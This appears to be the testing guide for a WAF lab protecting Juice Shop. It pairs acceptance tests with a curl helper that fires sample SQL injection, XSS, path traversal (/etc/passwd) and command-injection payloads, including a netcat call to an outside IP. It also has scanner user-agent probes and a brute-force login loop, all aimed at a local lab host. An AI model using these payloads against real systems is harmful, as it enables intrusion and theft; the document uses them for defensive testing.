# Testing and acceptance

The expected results below are the design intent, derived from the code and configuration. **Run every row on your own machine before the event and record the real result in the "Observed" column.**

## 1. Acceptance tests (what a judge will check)

| # | Requirement | Command | Pass condition | Observed |
|---|---|---|---|---|
| A1 | App is reachable only through the WAF with TLS | `curl --cacert certs/ca.crt --resolve shield.local:8443:127.0.0.1 -sI https://shield.local:8443/` | `200`, `Strict-Transport-Security` present, no `Server` version | |
| A2 | Old TLS refused | `openssl s_client -connect localhost:8443 -tls1_1 </dev/null` | handshake failure | |
| A3 | HTTP redirects to HTTPS | `curl -sI http://localhost:8080/` | `308` to `https://...:8443/` | |
| A4 | Juice Shop is not directly reachable | `curl -m 3 http://localhost:3000/` | connection refused or timeout | |
| A5 | Attacks work with no protection (baseline is honest) | `make mode-off && docker compose run --rm attacker python attack_replay.py` (no `--expect`, so it reports without failing) | checks show `PASSED THROUGH` and at least one `EXPLOIT SUCCEEDED` | |
| A6 | Every attack request blocked | `make mode-on && make unban && make attack` | exit code 0, `Blocked 20/20` | |
| A7 | At least 95% of benign requests allowed | `make benign` | exit code 0, `Allowed 27/27` (minimum 26/27) | |
| A8 | Brute force throttled and banned | see A6 output | `throttled at attempt <=8`, `Auto-ban active on attacker IP: yes` | |
| A9 | Benign client unaffected by the attacker's ban | `make attack && make benign` | benign still passes (different source IP) | |
| A10 | Alert summary by attack type | `make report && cat reports/alert_summary.md` | table with SQLi, XSS, path traversal, command injection, scanner, brute force, honeypot, virtual patch | |
| A11 | Logs centralised | `docker compose exec sentinel ls -l /var/log/shield` | `access.json`, `modsec_audit.json`, `nginx_error.log` | |
| A12 | Sentinel and console logic | `make test` | 12 Sentinel + 4 console tests pass, no Docker needed | |

`make demo` runs A5 to A8 and A10 in order and writes the evidence to `reports/`.

## 2. Judge-variation commands

Judges may send their own payloads. Use this helper and try variants before the event. The expected result for each is `403` and header `x-shield-action: blocked-waf` (or `blocked-ip` once the source has been banned).

```bash
export SW="--cacert certs/ca.crt --resolve shield.local:8443:127.0.0.1"
t() { curl -s -o /dev/null -D - $SW "$@" | grep -iE '^(HTTP|x-shield-action)' | tr '\r\n' ' '; echo; }
S=https://shield.local:8443/rest/products/search

# SQL injection
t -G --data-urlencode "q=' OR '1'='1" $S
t -G --data-urlencode "q=')) UNION SELECT NULL,NULL--" $S
t -G --data-urlencode "q=1; SELECT pg_sleep(5)--" $S
# Cross-site scripting
t -G --data-urlencode "q=<svg onload=alert(1)>" $S
t -G --data-urlencode 'q="><script>alert(1)</script>' $S
# Path traversal
t "https://shield.local:8443/ftp/..%2f..%2fetc%2fpasswd"
t "https://shield.local:8443/ftp/%2e%2e/%2e%2e/etc/passwd"
# Command injection
t -G --data-urlencode "q=;id" $S
t -G --data-urlencode 'q=`id`' $S
t -G --data-urlencode "q=|nc 203.0.113.9 4444" $S
# Scanner user agents (verify each one on your build)
for ua in "sqlmap/1.7" "Nikto/2.5" "gobuster/3.6" "Nmap Scripting Engine" "masscan/1.3"; do t -A "$ua" https://shield.local:8443/; done
# Brute force (expect 429 within a few attempts, then 403 from the ban)
for i in $(seq 1 20); do curl -s -o /dev/null -w '%{http_code} ' $SW -H 'Content-Type: application/json' \
  -d "{\"email\":\"admin@juice-sh.op\",\"password\":\"guess$i\"}" https://shield.local:8443/rest/user/login; done; echo
```

Notes for the presenter:

* Requests from your own host reach the stack through Docker's published port, so they appear from the gateway address `172.28.0.1`. That address is on the Sentinel allowlist, so judge variations from the host are **blocked by the WAF but never auto-banned**. That is deliberate, so a judge cannot lock you out during the demo.
* Run `make unban` before each judged run so earlier tests do not leave residual bans.
* If a variant gets through, write it in the tuning log and fix it with a narrow custom rule (see TUNING.md section 6).

## 3. Automated scripts

| Script | Requests | Exit code | Output |
|---|---|---|---|
| `lab/tests/attack_replay.py --expect block` | 16 payloads (SQLi 3, XSS 3, path traversal 3, command injection 3, scanner UAs 2, virtual patch 2) + 1 brute-force burst (40 attempts) + 3 honeypot probes = **20 checks** | 0 if all blocked | per-check verdict, exploit flag, auto-ban status, JSON report |
| `lab/tests/benign_replay.py` | **27** requests: browse, search, product detail, register, login, whoami, basket add/view, review, order history | 0 if at least 95% allowed | per-request verdict, JSON report |
| `sentinel/tests/test_engine.py` | 12 unit tests | 0 if all pass | classification, ban threshold, honeypot, allowlist, detect mode, escalation, blocklist sanitising |

Both replay scripts run in containers with fixed IPs (`172.28.0.100` attacker, `172.28.0.101` benign client) and verify the TLS certificate against the lab CA.

## 4. Evidence to collect for the submission

```
make mode-off && docker compose run --rm attacker python attack_replay.py   # keep the console output (baseline)
make demo                                         # writes reports/*
make report
cp -r reports submission/evidence
```
Include screenshots of the dashboard after the demo, the alert summary, and the three JSON reports.
